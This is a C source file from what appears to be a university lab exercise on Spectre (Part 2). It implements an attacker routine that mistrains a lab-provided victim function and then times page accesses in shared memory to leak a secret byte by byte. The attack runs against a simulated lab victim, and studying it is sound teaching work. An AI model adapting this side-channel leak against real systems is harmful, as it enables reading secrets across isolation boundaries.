/*
 * Exploiting Speculative Execution
 *
 * Part 2
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "labspectre.h"
#include "labspectreipc.h"

/* ### DONT MODIFY THIS FUNCTION ### 
 * call_kernel_part2
 * Performs the COMMAND_PART2 call in the shared library
 *
 * Arguments:
 *  - shared_memory: Memory region to share with the shared library
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part2(char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART2;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    //Call API from shared library
    lab2_sharedlib_victim(local_cmd);
}

/* ### FEEL FREE TO MODIFY THIS FUNCTION ### 
 * run_attacker
 *
 * Arguments:
 *  - shared_memory: A pointer to a region of memory shared with the server
 */
int run_attacker(char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    size_t current_offset = 0;

    printf("Launching attacker\n");

    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
        char leaked_byte;

        // [Part 2]- Fill this in!
        // leaked_byte = ??
        for (int i = 0; i < 4; i++) {
            for (int i = 0; i < 4; i++) {
                init_shared_memory(shared_memory, SHD_SPECTRE_LAB_SHARED_MEMORY_SIZE);
                call_kernel_part2(shared_memory, 1);
            }
        }

        init_shared_memory(shared_memory, SHD_SPECTRE_LAB_SHARED_MEMORY_SIZE);
        call_kernel_part2(shared_memory, current_offset);
        int page;
        for (page = 0; page < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; page++){
            uint64_t access_time = 0;
            int num_tries = 4;
            for (int i = 0; i < num_tries; i++) {
                uint64_t new_access = time_access(&shared_memory[page * SHD_SPECTRE_LAB_PAGE_SIZE]);
                printf("new access time %ld \n", new_access);
                access_time = access_time + new_access;
            }
            if ((access_time/num_tries) < 160) {
                printf("access time %ld \n", access_time/num_tries);
                break;
            }
        }
        //printf("%d \n", page);
        leaked_byte = (char)page;

        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00') {
            break;
        }
    }

    printf("\n\n[Part 2] We leaked:\n%s\n", leaked_str);
    return EXIT_SUCCESS;
}
